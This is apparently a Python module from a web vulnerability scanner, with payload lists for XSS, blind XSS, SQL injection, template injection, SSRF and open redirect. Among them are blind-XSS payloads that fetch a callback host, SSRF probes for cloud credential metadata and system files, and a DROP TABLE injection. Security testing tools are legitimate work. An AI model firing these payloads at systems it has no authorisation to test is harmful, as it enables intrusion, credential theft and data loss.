"""Payload generation service for auto-detecting security testing opportunities."""


class PayloadGenerator:
    """Generate payload sets for different vulnerability types."""

    # XSS payloads - reflected and stored variants
    XSS_PAYLOADS = [
        # Reflected XSS
        '"><script>alert(1)</script>',
        '"><svg/onload=alert(1)>',
        "')<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "javascript:alert(1)",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        # Event handler variations
        '<iframe src=javascript:alert(1)>',
        '<img src=/ onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        # Protocol-based
        '<a href="javascript:alert(1)">click</a>',
        # DOM-based patterns
        '${alert(1)}',
        '{{alert(1)}}',
        '<% alert(1) %>',
    ]

    # Blind XSS payloads - these will trigger callbacks to our collector
    BLIND_XSS_PAYLOADS = [
        # Basic blind XSS with image callback
        '<img src=x onerror="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
        # Script-based callback
        '<script>fetch("https://yourdomain.com/xss/__TOKEN__")</script>',
        # SVG onload callback
        '<svg onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
        # Iframe callback
        '<iframe src="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')"></iframe>',
        # Form submission callback
        '<form action="https://yourdomain.com/xss/__TOKEN__" method="POST"><input type="submit"></form>',
        # Link click callback
        '<a href="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')">click</a>',
        # Body onload callback
        '<body onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
        # Input focus callback
        '<input onfocus="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" autofocus>',
        # Details toggle callback
        '<details ontoggle="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" open>',
        # Marquee start callback
        '<marquee onstart="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
    ]

    # SQLi payloads - basic detection only
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL, NULL, NULL --",
        "1' AND '1'='1",
        "1' OR '1'='1' --",
        "admin' --",
        "' OR 1=1 --",
        "1' AND SLEEP(5) --",
        "1' UNION SELECT version() --",
        "1' UNION ALL SELECT NULL --",
    ]

    # SSTI payloads
    SSTI_PAYLOADS = [
        # Jinja2/Django
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "${config}",
        "{{request}}",
        # Expression Language
        "#{request}",
        # Velocity
        "#set($x=123)$x",
        # Freemarker
        "<#assign x=123>${x}",
        # Thymeleaf
        "[(${7*7})]",
        "[($7*7$)]",
    ]

    # SSRF payloads - these will trigger callbacks to our detector
    SSRF_PAYLOADS = [
        # Internal services
        "http://127.0.0.1:8000/ssrf/__TOKEN__",
        "http://localhost:8000/ssrf/__TOKEN__",
        "http://127.0.0.1:80/ssrf/__TOKEN__",
        "http://localhost:80/ssrf/__TOKEN__",
        # Cloud metadata services
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://instance-data.c.internal/",
        # Protocol-based
        "gopher://127.0.0.1:25/HELO",
        "dict://127.0.0.1:11211/",
        "sftp://127.0.0.1/",
        # File system access
        "file:///etc/passwd",
        "file:///proc/self/environ",
    ]

    # Open Redirect payloads
    OPENREDIRECT_PAYLOADS = [
        "//example.com",
        "///example.com",
        "////example.com",
        "http://example.com",
        "https://example.com",
        "//google.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "\nhttp://example.com",
        "\rhttp://example.com",
        "//google.com%40example.com",
        "//example.com@google.com",
    ]

    @classmethod
    def get_payloads_for_type(cls, vuln_type: str) -> list[str]:
        """Get payload list for a specific vulnerability type."""
        vuln_type = vuln_type.lower()
        if vuln_type in ("xss", "reflected_xss", "stored_xss"):
            return cls.XSS_PAYLOADS
        elif vuln_type in ("blind_xss", "blindxss"):
            return cls.BLIND_XSS_PAYLOADS
        elif vuln_type in ("sqli", "sql_injection"):
            return cls.SQLI_PAYLOADS
        elif vuln_type in ("ssti", "template_injection"):
            return cls.SSTI_PAYLOADS
        elif vuln_type in ("ssrf", "server_side_request_forgery"):
            return cls.SSRF_PAYLOADS
        elif vuln_type in ("openredirect", "open_redirect"):
            return cls.OPENREDIRECT_PAYLOADS
        return []

    @classmethod
    def get_all_payload_types(cls) -> list[str]:
        """List all available payload vulnerability types."""
        return ["xss", "blind_xss", "sqli", "ssti", "ssrf", "openredirect"]
